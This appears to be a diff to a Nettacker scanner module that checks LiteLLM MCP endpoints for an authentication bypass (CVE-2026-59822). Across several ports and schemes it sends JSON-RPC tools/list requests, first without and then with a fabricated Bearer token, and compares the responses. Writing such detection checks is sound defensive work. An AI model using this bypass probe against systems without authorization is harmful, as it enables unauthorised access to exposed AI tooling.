@@ -50,17 +50,14 @@ payloads:
             data:
               schema:
                 - "http"
-                - "https"
               ports:
                 - 4000 # default litellm port
-                - 80
-                - 443
         response:
-          save_to_temp_events_only: authentication_in_place
+          save_to_temp_events_only: authentication_in_place_http_default_port
           condition_type: and
           conditions:
             status_code:
-              regex: ^(4\d\d|5\d\d)$
+              regex: ^\d\d\d$
               reverse: false
 
       # Attempt authentication bypass with fabricated Authorization header: 
@@ -89,13 +86,252 @@ payloads:
             data:
               schema:
                 - "http"
+              ports:
+                - 4000 # default litellm port
+        response:
+          dependent_on_temp_event: authentication_in_place_http_default_port
+          condition_type: and
+          conditions:
+            status_code:
+              regex: dependent_on_temp_event[0]['status_code'][0]
+              reverse: true
+            iterative_response_match:
+              authentication_bypass:
+                response:
+                  condition_type: and
+                  conditions:
+                    status_code:
+                      regex: ^2\d\d$
+                      reverse: false
+                    content:
+                      regex: (?s)"jsonrpc"\s*:\s*"2.0".*"id"\s*:\s*1234.*"tools"
+                      reverse: false
+
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
                 - "https"
               ports:
                 - 4000 # default litellm port
+        response:
+          save_to_temp_events_only: authentication_in_place_https_default_port
+          condition_type: and
+          conditions:
+            status_code:
+              regex: ^\d\d\d$
+              reverse: false
+
+      # Attempt authentication bypass with fabricated Authorization header: 
+      # it is successful only if the status code differs from the previous authentication check, besides meeting the other conditions
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer NETTACKER-CVE-2026-59822"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 4000 # default litellm port
+        response:
+          dependent_on_temp_event: authentication_in_place_https_default_port
+          condition_type: and
+          conditions:
+            status_code:
+              regex: dependent_on_temp_event[0]['status_code'][0]
+              reverse: true
+            iterative_response_match:
+              authentication_bypass:
+                response:
+                  condition_type: and
+                  conditions:
+                    status_code:
+                      regex: ^2\d\d$
+                      reverse: false
+                    content:
+                      regex: (?s)"jsonrpc"\s*:\s*"2.0".*"id"\s*:\s*1234.*"tools"
+                      reverse: false
+
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
                 - 80
+        response:
+          save_to_temp_events_only: authentication_in_place_http
+          condition_type: and
+          conditions:
+            status_code:
+              regex: ^\d\d\d$
+              reverse: false
+
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer NETTACKER-CVE-2026-59822"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+        response:
+          dependent_on_temp_event: authentication_in_place_http
+          condition_type: and
+          conditions:
+            status_code:
+              regex: dependent_on_temp_event[0]['status_code'][0]
+              reverse: true
+            iterative_response_match:
+              authentication_bypass:
+                response:
+                  condition_type: and
+                  conditions:
+                    status_code:
+                      regex: ^2\d\d$
+                      reverse: false
+                    content:
+                      regex: (?s)"jsonrpc"\s*:\s*"2.0".*"id"\s*:\s*1234.*"tools"
+                      reverse: false
+
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
                 - 443
         response:
-          dependent_on_temp_event: authentication_in_place
+          save_to_temp_events_only: authentication_in_place_https
+          condition_type: and
+          conditions:
+            status_code:
+              regex: ^\d\d\d$
+              reverse: false
+
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer NETTACKER-CVE-2026-59822"
+          Content-Type: "application/json"
+          Accept: "application/json, text/event-stream"
+        ssl: false
+        allow_redirects: false
+        json:
+          jsonrpc: "2.0"
+          id: 1234
+          method: "tools/list"
+          params: 
+            name: "nettacker_cve_2026_59822"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 443
+        response:
+          dependent_on_temp_event: authentication_in_place_https
           condition_type: and
           conditions:
             status_code:
